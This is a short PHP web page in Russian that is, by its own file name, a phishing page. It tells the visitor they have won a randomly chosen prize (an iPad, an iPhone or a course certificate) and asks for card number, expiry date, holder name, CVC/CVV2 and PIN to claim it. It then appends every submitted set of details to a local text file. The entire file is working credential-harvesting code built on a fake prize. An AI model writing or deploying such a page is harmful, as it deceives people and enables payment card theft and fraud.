<head>
  <link rel="stylesheet" type="text/css" href="style.css">
</head>
<?php
    $prizes = ["IPad", "IPhone", "Сертификат на обучение в Гекконе"];
    $pictures = ["IPad"=>"ipad.jpg", "IPhone" => "iphone.png", "Сертификат на обучение в Гекконе"=>"gekkon.png"];
    $file = fopen("database.txt", "a");
    $v = $prizes[rand(0,2)];
    echo "<h1>ПОЗДРАВЛЯЕМ! ВЫ ВЫИГРАЛИ ПРИЗ!</h1>
    <p>".$v."</p>
    <img src=".$pictures[$v]." height=50%>
    <p>Чтобы получить его введите данные своей кредитной карты</p>
    <form action='fishing.php' method='POST'>
        <input type='text' name='number' placeholder='Номер карты'>
        <input type='text' name='dur' placeholder='Окончание срока действия карты'>
        <input type='text' name='name' placeholder='Имя и фамилия владельца'>
        <input type='text' name='cvc' placeholder='CVC/CVV2'>
        <input type='text' name='pin' placeholder='PIN-код'>
        <input type='submit'>
    </form>";
    if ((isset($_POST["number"])) and (isset($_POST["dur"])) and (isset($_POST["name"])) and (isset($_POST["cvc"])) and (isset($_POST["pin"]))){
        if (($_POST["number"]!="") and ($_POST["dur"]!="") and ($_POST["name"]!="") and ($_POST["cvc"]!="") and ($_POST["pin"]!="")){
            fwrite($file,$_POST["number"]." ".$_POST["dur"]." ".$_POST["name"]." ".$_POST["cvc"]." ".$_POST["pin"].PHP_EOL);
        }else{
            echo "<p>Заполнены не все поля</p>";
        }
    }
?>